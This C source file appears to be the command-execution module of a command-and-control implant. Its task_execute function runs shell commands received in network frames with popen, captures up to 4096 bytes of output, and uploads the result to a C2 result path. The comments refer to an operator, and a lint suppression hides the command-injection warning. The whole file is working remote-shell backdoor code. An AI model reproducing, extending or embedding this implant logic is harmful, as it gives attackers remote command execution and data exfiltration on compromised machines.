#include "tasks.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "frame_post.h"
#include "protocol.h"

/* Cap on the output uploaded for one command. */
#define OUTPUT_MAX 4096

/* Appended when the command printed more than that, so the operator can tell a
   short result from a clipped one. */
static const char kTruncated[] = "\n[output truncated]\n";

/* popen() wants a NUL-terminated string; the payload that arrived in a frame is
   exactly payload_size bytes, with no terminator of its own. */
static char *terminated_copy(const char *payload, size_t payload_len)
{
  char *copy = malloc(payload_len + 1);

  if (copy == NULL)
  {
    fprintf(stderr, "allocation failed\n");
    return NULL;
  }
  memcpy(copy, payload, payload_len);
  copy[payload_len] = '\0';
  return copy;
}

/* Run 'command' through the shell, keeping at most 'cap' bytes of its output.

   The pipe is drained to EOF even once the buffer is full: leaving it unread
   can block the child on a full pipe, and the leftover is what shows the output
   was clipped. 'output' is not NUL-terminated -- the frame carries a length.

   Returns 0, or -1 when the pipe could not be opened (already reported), in
   which case there is nothing to upload. */
static int run_command(const char *command, char *output, size_t cap,
                       size_t *output_len, int *truncated)
{
  FILE *pipe = popen(command, "r"); // NOLINT(bugprone-command-processor,clang-analyzer-optin.taint.GenericTaint)
  char chunk[512];
  size_t total = 0;

  if (pipe == NULL)
  {
    fprintf(stderr, "pipe failed\n");
    return -1;
  }

  for (;;)
  {
    size_t got = fread(chunk, 1, sizeof chunk, pipe);
    size_t room = cap - total;
    size_t keep = got < room ? got : room;

    if (got == 0)
    {
      break;
    }
    memcpy(output + total, chunk, keep);
    total += keep;
    if (keep < got)
    {
      *truncated = 1;
    }
  }
  pclose(pipe);

  *output_len = total;
  return 0;
}

void task_execute(const struct target_config *target, const char *payload,
                  size_t payload_len)
{
  char output[OUTPUT_MAX];
  size_t output_len = 0;
  int truncated = 0;
  char *command = terminated_copy(payload, payload_len);
  int status;

  if (command == NULL)
  {
    return;
  }

  /* Leave room for the marker rather than clipping the marker itself. */
  status = run_command(command, output, sizeof(output) - sizeof(kTruncated),
                       &output_len, &truncated);
  free(command);

  if (status != 0)
  {
    return;
  }

  if (truncated)
  {
    memcpy(output + output_len, kTruncated, sizeof(kTruncated) - 1);
    output_len += sizeof(kTruncated) - 1;
  }

  status = post_frame(target, C2_PATH_RESULT, CMD_EXECUTE_SHELL, output,
                      output_len, NULL, NULL);
  if (status != 200)
  {
    fprintf(stderr, "upload failed (%d)\n", status);
  }
}
